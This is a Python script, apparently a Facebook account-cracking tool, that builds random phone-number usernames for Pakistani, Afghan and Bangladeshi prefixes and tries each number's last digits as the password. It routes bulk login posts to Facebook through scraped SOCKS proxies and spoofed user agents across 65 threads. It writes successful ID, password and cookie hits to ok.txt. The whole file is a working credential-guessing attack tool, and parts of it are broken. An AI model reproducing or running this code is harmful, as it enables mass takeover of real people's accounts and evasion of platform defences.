#coding=utf
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"

uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"

#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

# lempankkkkkkkk

ugen2=[]

ugen=[]
try:

    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text

    open('.prox.txt','w').write(prox)

except Exception as e:
	

    exit(e)

aqib_dalvik_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; P13_Blue_Plus_2022 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; B17 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 12; SOG02 Build/58.2.C.3.127)","Dalvik/2.1.0 (Linux; U; Android 11; SmartVision3 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J200M Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 12.0; TX10MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; TECNO CH9 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; GM1917 Build/SKQ1.211019.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g82 5G Build/S1SUS32.73-112-2-7)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; VUVAMINI Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; HOTREALS Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; DECSMART Build/RTT0.211009.001)","Dalvik/2.1.0 (Linux; U; Android 12; T28-EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (XT2115DL) Build/RPCS31.Q2-109-16-16)","Dalvik/2.1.0 (Linux; U; Android 8.1; HOT10 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-14)","Dalvik/2.1.0 (Linux; U; Android 11; KIVI 4K Android TV Build/RTM5.220609.207)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)","Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016) VD/229","Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012) VD/233","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N)","Dalvik/2.1.0 (Linux; U; Android 13; V2205 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1) ;Pixel 6a","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)","Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-7)","Dalvik/2.1.0 (Linux; U; Android 9; Aquaris X Pro Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ72 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 11; XM-SW1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-V600 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K7AI Build/TQ1A.230105.002)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G20 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; 22041219PI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6826B Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-31-3)","Dalvik/2.1.0 (Linux; U; Android 11; M2003J15SC Build/RP1A.200720.011) VD/233","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) PB/102","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415FN Build/M1AJQ) PB/102","Dalvik/2.1.0 (Linux; U; Android 13; DN2101 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; PHB110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Helium Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; MS5539G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; VRD-W10 Build/HUAWEIVRD-W10)","Dalvik/2.1.0 (Linux; U; Android 9; HP Chromebook x360 11 G1 EE Build/R114-15437.8.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; motorola razr 2022 Build/S3SLS32.16-72-14-6)","Dalvik/2.1.0 (Linux; U; Android 11; Schok Volt SV55 Build/SV55216_01.02.04)","Dalvik/2.1.0 (Linux; U; Android 11; Multilaser_GMAX_2 Build/V8_20230215)","Dalvik/2.1.0 (Linux; U; Android 13; S9-KC Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g41 Build/S3RWS32.138-29-5-1)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-26)","Dalvik/2.1.0 (Linux; U; Android 7.0; 4047G Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A716S Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; SHV45-u Build/SA110)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A336N Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G950F Build/PPR1.180610.011) PB/102","Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) PB/102","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A520F Build/R16NW) PB/102","Dalvik/1.6.0 (Linux; U; Android 4.4.2; XT907 Build/KPA20.10.1)","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 4 Build/QQ2A.200501.001.B2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; HELIOS Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; BRQ-AN00 Build/HUAWEIBRQ-AN00)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 pro Build/T1SHS33.35-23-20-2)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.78)","Dalvik/2.1.0 (Linux; U; Android 9; U-BOX A9 Build/UMAX_AI_M)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; SH-A01 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; skipper Build/OTT1.201231.001/6.0.5.0421)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0021.0)","Dalvik/2.1.0 (Linux; U; Android 10; mainline Build/QD4A.200805.003)","Dalvik/2.1.0 (Linux; U; Android 10; M10_4G_PRO Build/V17_20230110)","Dalvik/2.1.0 (Linux; U; Android 11; P60_EEA Build/MX2_EEA)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-22)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 9; H8416 Build/52.0.A.8.157)","Dalvik/2.1.0 (Linux; U; Android 11; X96_X4_Pro Build/RD2A.211001.002)",])    

for xd in range(10000):

    a='Mozilla/5.0 (Symbian/3; Series60/'

    b=random.randrange(1, 9)

    c=random.randrange(1, 9)

    d='Nokia'

    e=random.randrange(100, 9999)

    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

    g=random.randrange(1, 9)

    h=random.randrange(1, 4)

    i=random.randrange(1, 4)

    j=random.randrange(1, 4)

    k='Mobile Safari/535.1'

    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['6','7','8','9','10','11','12'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    
    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
os.system("xdg-open fb://group/1668513340063475?ref=share")

logo ="""\033[1;97m
       \033[1;32m########  ####    ###    ######## 
       \033[1;33m##     ##  ##    ## ##        ##  
       \033[1;34m##     ##  ##   ##   ##      ##   
       \033[1;35m########   ##  ##     ##    ##    
       \033[1;36m##   ##    ##  \033[1;35m#########   ##     
       \033[1;37m##    ##   ##  ##     ##  ##      
       \033[1;33m##     ## #### ##     ## ######## 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mMR.RIAZ
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mMR.RIAZ
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mRIAZ-143
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mRANDOM
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.7.1
\033[1;32m[+]==============================================   
            \033[1;31m• \033[1;33m• \033[1;34m• \033[1;36mTEAM AR  \033[1;31m• \033[1;33m• \033[1;34m• """
BLUE = '\033[1;32m'
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {BLUE}SORRY NO ACTIVE APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {BLUE}YOUR ACTIVE APPLICATION DETAILS:'%(H))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {BLUE}SORRY NO EXPIRED APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {BLUE}YOUR EXPIRED APPLICATION DETAILS:'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
loop = 0
oks = []
cps = []
				
def main():
    os.system('clear')
    print(logo)
    print(49*'=')
    print('[1]\033[1;37m START RANDOM CRACK')
    print(49*'=')
    opt = input('[!]\033[1;33m SELECT OPTION ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;92mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1]\033[1;32m 7DIGIT PASS CRACK')   
    print('[B] Back')
    print(47*'=')
    opt = input('[!]\033[1;33m SELECT OPTION ')
    if opt =='1':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;92mChoose valid option\033[0;97m')
def random_number():
    uid=[]
    os.system('clear')
    print(logo)
    print('\033[1;32m[+]==============================================')
    print('\033[1;93m[√] PAKISTAN SIM CODE : 👇')
    print('\033[1;32m[~] \033[1;32m92306,92300,92315,92318,92345 ETC\033[0;97m')
    print('\033[1;32m[+]==============================================')
    print('\033[1;94m[√] APGHAN SIM CODE : 👇')
    print('\033[1;32m[~] \033[1;32m9370,9371,9372,9377 ETC...\033[0;97m')
    print('\033[1;32m[+]==============================================')
    print('\033[1;95m[√] BANGLA SIM CODE : 👇')   
    print('\033[1;32m[~] \033[1;32m880130,880140,880150 ETC...\033[0;92m')
    print(49*'=')
    kode = input('[+]\033[1;36m Put  Your Country Code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        jalan('Total ids: '+tl)
        jalan('Choice Code: '+kode)
        jalan('The process has been started')
        jalan('Use flight mode for speed up')
        print('\033[1;32m[+]==============================================')
        for guru in uid:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(47*'-')

def rcrack(uid,pwx,tl):
    #print(uid)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ua = random.choice(ugen)
            ua2 = random.choice(ugen2)   
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            'method': 'path',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
            'dnt':'1', 
            'x-requested-with':'mark.via.gp', 
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            "sec-ch-prefers-color-scheme": "light",
            'user-agent': aqib_dalvik_ua}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;92m[RIAZ-OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps)
